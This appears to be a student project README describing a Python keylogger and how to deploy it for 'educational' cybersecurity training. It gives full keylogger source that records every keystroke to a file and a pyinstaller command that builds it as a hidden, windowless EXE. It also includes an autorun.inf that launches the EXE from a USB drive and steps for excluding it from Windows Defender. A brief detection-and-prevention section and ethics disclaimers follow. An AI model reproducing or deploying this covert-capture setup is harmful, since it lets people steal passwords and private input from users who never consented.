# **Keylogger Project for Cybersecurity Training**  

### **By:** Bilal Sihadi & Mohamed Rouabhi  
### **Course:** CIS 260  
### **Professor:** MD Ali  

---

## 📌 **Project Overview**  
This project is about developing a **keylogger** for **educational and ethical use** in cybersecurity training. The goal is to understand how keyloggers work, how they can capture sensitive data, and how to detect and prevent them.  

⚠ **Important:** This project is **only for learning purposes**. Using keyloggers without permission is illegal. Always follow ethical hacking guidelines.  

---

## 🎯 **Project Goals**  
- ✅ Build a **software-based keylogger** using **Python**.  
- ✅ Deploy a **USB-based keylogger** that runs when plugged into a computer.  
- ✅ Study how keyloggers work on **Windows and Linux**.  
- ✅ Research and test **detection & prevention methods**.  

---

##  **Features**  
### **🔹 Software Keylogger**  
- Records **all keystrokes** (letters, numbers, special keys).  
- Saves logs **locally** with **timestamps**.  
- Works on **Windows & Linux**.  
- Can run in **stealth mode**.  

### **🔹 USB-Based Keylogger (Software Approach)**  
- Runs automatically when plugged into a Windows machine.  
- Stores captured keystrokes on the USB drive.  
- Uses **Python and AutoRun scripts**.  
- No need for special hardware.  

---

##  **How to Install & Run in Windows**  

### **1️⃣ Software Keylogger (Python)**  
#### **Requirements:**  
- Python 3.13  
- Required library: `pynput`  

![xxx](https://github.com/user-attachments/assets/c1e00f6a-a929-4c17-bd29-517bd8da9bad)

#### **Installation:**  
```sh
pip install pynput
```

#### **Keylogger Code (Python)**  
Copy and save the following code as **keylogger.py**:

```python
from pynput import keyboard   # Import the keyboard listener from the pynput library
from datetime import datetime   # Used to timestamp each keypress
import time    # Used to keep the script running
def keyPressed(key):    # Handles key press events, logs the key pressed along with the timestamp.
     with open("keyfile.txt", 'a') as logKey:  # Open the log file in append mode so previous keystrokes are not overwritten
         try:
             # Log regular character (letters, numbers) 
             logKey.write(f"{datetime.now()} - {key.char}\n")
         except AttributeError:
             # Log special keys (like Enter, Shift, etc.) with timestamp in brackets
             logKey.write(f"{datetime.now()} - [{key.name}]\n")
 
if __name__ == "__main__":
     # Start listening for key presses
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()  # Start listening
     # Keep the script running quietly in the background
     while True:
         time.sleep(1) # Sleep to prevent high CPU usage
```

#### **Run the Keylogger:**  
```sh
python keylogger.py
```
- The script will record all keystrokes and store them in **keyfile.txt**.  

---

### **2️⃣ USB Keylogger Setup (Windows - Software-Based)**  
This method turns a normal USB drive into a **portable keylogger** that starts when plugged into a Windows computer.
![vvvvvv](https://github.com/user-attachments/assets/0fa7454d-81fb-4028-8777-f23a8bf06991)

#### **Step 1: Convert the Keylogger to an Executable**  
To run without needing Python installed, convert it into an **EXE file**:  
```sh
pip install pyinstaller
pyinstaller --onefile --noconsole keylogger.py
```
![zzz](https://github.com/user-attachments/assets/1281becb-9dc9-412a-9440-69025ffa8628)

- This will create an EXE file in the `dist/` folder.  
- Move `dist/keylogger.exe` to the USB drive.  

---

#### **Step 2: Create an Autorun Script**  
1. Open Notepad and paste the following:  
   ```ini
   [Autorun]
   open=keylogger.exe
   action=Open folder to view files
   ```
2. Save this as **autorun.inf** on the USB drive.  

---

#### **Step 3: Plug the USB Into a Windows Computer**  
- If **AutoRun** is enabled, `keylogger.exe` will start running in the background.  
- If not, manually open the USB and **run keylogger.exe**.
  
  ![vv](https://github.com/user-attachments/assets/88f3a628-336b-4a40-a047-f45cd780964a)
  
---

## 📄 Example Output

The keylogger stores keystrokes with timestamps in a file named `keyfile.txt`.  
Below is a sample snippet of the output:

![ccc](https://github.com/user-attachments/assets/33b01b86-f41e-443c-ac4b-6cea9582a52c)


##  **How to Install & Run in Linux** 

Install the pynput library:

pip3 install pynput

![Screenshot 2025-04-22 233931](https://github.com/user-attachments/assets/f2528722-3e0c-4c6a-a4fc-b5bb01eed2e8)


▶️ Usage: Run the script:

![Screenshot 2025-04-22 234016](https://github.com/user-attachments/assets/2f20b49e-6cef-4492-afab-cb1ed87a3cb4)


Check the logged keys:

![Screenshot 2025-04-22 234059](https://github.com/user-attachments/assets/dda7a194-838b-4dfc-b216-c878a96b2638)


## 📄 Example Output

The keylogger stores keystrokes with timestamps in a file named `keyfile.txt`.  
Below is a sample snippet of the output:

![Screenshot 2025-04-22 234123](https://github.com/user-attachments/assets/ea6aff5a-4733-44a3-8db0-867f5f596378)


❌ To Stop the Script
Find the process and kill it:

![Screenshot 2025-04-22 234644](https://github.com/user-attachments/assets/9b3ee8c5-2722-4b33-891c-5c0563ea4016)


## 🔐 Windows Defender Exclusion

To prevent automatic deletion during testing:

1. Open **Windows Security**
2. Go to **Virus & threat protection** → **Manage settings**
3. Scroll down to the **Exclusions** section
4. Click **Add or remove exclusions**
5. Add:
   - The `.exe` file (e.g., `keylogger.exe`)
     
⚠️ This step is important because antivirus software (especially Windows Defender) will likely detect and remove your keylogger.

![nnnn](https://github.com/user-attachments/assets/4c7d0f56-911c-4ecd-bd2d-106f8fa01e3c)

---

## 🛡️ How to Detect & Prevent Keyloggers

Keyloggers can be hidden in software or hardware. Below are steps to help detect and prevent them:

- **Disable AutoRun & AutoPlay**  
  Prevents automatic execution from USB or external media.

- **Use Antivirus & Endpoint Security**  
  Scan for known keylogger signatures and behavior.

- **Monitor Running Processes**  
  Identify unusual or suspicious tasks using Task Manager or `ps`.
  
![qqq](https://github.com/user-attachments/assets/c71717f9-e089-4674-8fdd-48c79578d6c3)

- **Encrypt Sensitive Keystrokes**  
  Use tools or secure input fields that protect against keylogging.

- **Check for USB-Based Devices**  
  Inspect physical USB connections. Use device control policies to block unauthorized peripherals (e.g., USBGuard, Windows Group Policy).
  
---

##  **Ethical Considerations**  
- This project is for **learning and research only**.  
- Testing is done in a **controlled environment** (no real user data).  
- Always get **permission** before using keyloggers.  

---

##  **Expected Outcomes**  
- A **fully working keylogger** for **ethical training**.  
- A report on **how to detect and prevent keyloggers**.  
- A better understanding of **cybersecurity threats**.  

---

##  **Contributors**  
  **Bilal Sihadi**  
  **Mohamed Rouabhi**  

---

##  **License**  
This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

